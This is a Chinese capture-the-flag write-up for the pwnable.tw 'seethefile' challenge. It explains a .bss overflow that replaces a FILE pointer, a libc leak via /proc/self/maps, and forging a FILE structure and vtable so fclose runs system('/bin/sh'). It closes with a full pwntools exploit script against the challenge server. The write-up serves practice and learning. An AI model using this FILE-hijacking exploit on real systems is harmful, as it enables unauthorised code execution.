---
title: seethefile
categories:
- pwnable.tw
---
# pwnable.tw->seethefile

## 前言

SUCTF里做了一道简单的文件题，想趁热打铁多了解一些文件结构的知识，于是时隔多年再次杀回pwnable.tw，不过遗憾的是这个题还是没能自己做出来，不过依然有一些trick可以借鉴，因此写篇writeup提醒自己

## 程序逻辑

程序也比较简单，用户输入文件名，打开之后每次读取0x18F字节，输出到屏幕上，关闭文件，退出。这里的exit前会让用户输入自己的姓名，name位于.bss段的0x0804B260处，而文件句柄fp位于.bss段的0x0804B280处。这里的scanf并没有限制输入的长度，因此存在溢出漏洞。

![code](./1.jpg)

## 数据构造

### Libc基址
根据前面学到的知识，文件可以通过覆写vtable来修改一些函数指针指向我们想要执行的函数。因此，可以通过伪造FILE结构来执行shell，首先是libc基址的寻找，也正是在这里我直接卡住放弃的。看了p4nda师傅的wp得知文件执行的时候Linux会将进程的虚拟地址空间存储在/proc/<PID>/maps里，由于我们无从得知PID，因此使用self即可看到本进程的映射表，第一行libc.so的起始地址即为libc加载的基地址。这里还要注意由于read的长度有限，需要两次读才能读到libc.so。得到Libc基址之后即可得到system的地址。

### FILE结构体
FILE结构体比较复杂，构造的时候要注意一些关键的验证条件要满足，这里给出CTF All In One的libio.h中的实现(glibc2.23)
```c++
struct _IO_FILE {
  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;    /* Current read pointer */
  char* _IO_read_end;    /* End of get area. */
  char* _IO_read_base;    /* Start of putback+get area. */
  char* _IO_write_base;    /* Start of put area. */
  char* _IO_write_ptr;    /* Current put pointer. */
  char* _IO_write_end;    /* End of put area. */
  char* _IO_buf_base;    /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION && _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;
# endif
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};

extern struct _IO_FILE_plus _IO_2_1_stdin_;
extern struct _IO_FILE_plus _IO_2_1_stdout_;
extern struct _IO_FILE_plus _IO_2_1_stderr_;
```
```c++
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};

/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

extern struct _IO_FILE_plus *_IO_list_all;
```

这里伪造结构体的时候有一些关键的点需要注意:  
1. IO_FILE结构体偏移0x34的地方即_chain字段指向的也是一个FILE结构，我们可以使用_IO_2_1_stderr_，_IO_2_1_stderr_，_IO_2_1_stdout_或者，也可以使用自己的FILE结构体地址(不过实测发现stderr不可以,猜测里面用到了read和write但是没有setbuf(stderr)，即这个流没打开，不过正常应该这仨都是自动打开的才是Orz)
2. 位于0x48偏移的_lock必须指向一个为NULL的空间，因此我们可以用\x00填充name,在这里填name的地址
3. _vtable_offset要为0，其位于0x46处且只占一个字节
4. 其余部分是0或者0xffffffff按照未溢出前正常fp结构体的分布来写
5. vatable的前两个地址为NULL
6. close函数覆写为system，函数执行的时候的参数为fp，故可以将fp的开头改为/bin/sh\x00，即可让fclose(fp)变为syetm(fake_fp),fake_fp->/bin/sh\x00

综上所述最终的payload结构如下:


## exp.py

```python
#coding=utf-8
from pwn import *
debug = 0
context.update(arch='i386',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
elf = ELF('./seethefile')
libc = ELF('./libc_32.so.6')
if debug:
    sh = process('./seethefile')
else:
    sh = remote('chall.pwnable.tw',10200)
#gdb.attach(sh)
fp_addr = 0x0804B280
sh.recvuntil('Your choice :')
sh.sendline('1')
sh.recvuntil('What do you want to see :')
sh.sendline('/proc/self/maps')
sh.recvuntil('Your choice :')
sh.sendline('2')
sh.recvuntil('Your choice :')
sh.sendline('3')
sh.recvuntil('Your choice :')
sh.sendline('2')
sh.recvuntil('Your choice :')
sh.sendline('3')
##get libc base addr
sh.recvline(1)
libc_addr = int(sh.recvuntil('-')[:-1],16)
log.success('libc base addr => ' + hex(libc_addr))
#shell_addr = libc_addr + 0x5f065
shell_addr = libc_addr + libc.symbols['system']
sh.recvuntil('Your choice :')
sh.sendline('5')
##
sh.recvuntil('Leave your name :')
vtable_addr = fp_addr+0x94
payload = '\x00'*0x20
payload +=  p32(0x0804B284)
payload += '/bin/sh\x00'
payload += p32(0)*11#9
payload += p32(libc_addr+libc.symbols['_IO_2_1_stdin_'])#1
#payload += p32(0x0804b284)
payload += p32(3)+p32(0)*3 + p32(0x0804b260)#6
payload += p32(0xffffffff)*2#3
payload += p32(0) * 16#14
payload += p32(fp_addr+len(payload)+4-0x20)
payload += p32(0)*2 + p32(0) * 15 + p32(shell_addr) + p32(0) * 3
sh.sendline(payload) 
sh.interactive()
```
